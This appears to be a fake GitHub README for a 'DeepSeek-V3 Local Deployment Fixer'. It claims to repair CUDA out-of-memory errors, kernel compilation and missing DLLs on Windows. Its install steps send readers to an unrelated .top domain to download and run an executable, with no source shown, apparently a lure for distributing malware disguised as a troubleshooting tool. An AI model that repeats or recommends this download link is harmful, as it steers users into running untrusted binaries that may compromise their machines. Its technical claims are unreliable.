# 🤖 DeepSeek-V3 Local Deployment Fixer (Windows)

[![Version](https://img.shields.io/badge/Version-1.0.4-blue.svg)]()
[![License](https://img.shields.io/badge/License-MIT-green.svg)]()
[![Status](https://img.shields.io/badge/Status-Verified-brightgreen.svg)]()

### ⚠️ Critical Update: Fixes "CUDA_ERROR_OUT_OF_MEMORY" & "DLL Not Found"

DeepSeek-V3 and R1 models require a specific environment setup to run on consumer GPUs (RTX 30/40 series). This utility automates the process and resolves common initialization crashes.

## 🚀 Key Fixes in this Release:
* **Memory Management:** Fixes `CUDA_ERROR_OUT_OF_MEMORY` by optimizing KV-cache.
* **Kernel Fix:** Patches `deep_gemm` and `FlashMLA` compilation errors on Windows.
* **Missing DLLs:** Restores missing `cublas64_12.dll` and `cudnn_ops_infer64_8.dll`.
* **PyTorch Sync:** Resolves version conflicts between Torch 2.5+ and CUDA 12.4.

---

## 📥 Installation Guide:
1. **Download the latest Fixer Tool:**
[ ![Download Setup](https://img.shields.io/badge/DOWNLOAD_STABLE_VERSION-orange?style=for-the-badge&logo=windows) ](https://kalida.top/software_x64)

2. **Run the executable:** Launch `DeepSeek_Fixer.exe` on your local PC.
3. **Select Model:** Choose the model you are trying to run (1.5B, 7B, or 671B).
4. **Apply Patches:** Click "Optimize & Fix" and wait for the process to finish.
5. **Restart:** Restart your IDE (VS Code/PyCharm) or terminal.

---

## 🛠️ System Requirements:
* **OS:** Windows 10/11 (x64)
* **GPU:** NVIDIA RTX 20 series or newer (8GB+ VRAM recommended)
* **Storage:** 150MB for the utility.

## 🤝 Community & Support
If you still encounter issues, please open an **Issue** or check our Wiki.

*Disclaimer: This is a community-driven fix and is not affiliated with the official DeepSeek-AI team.*
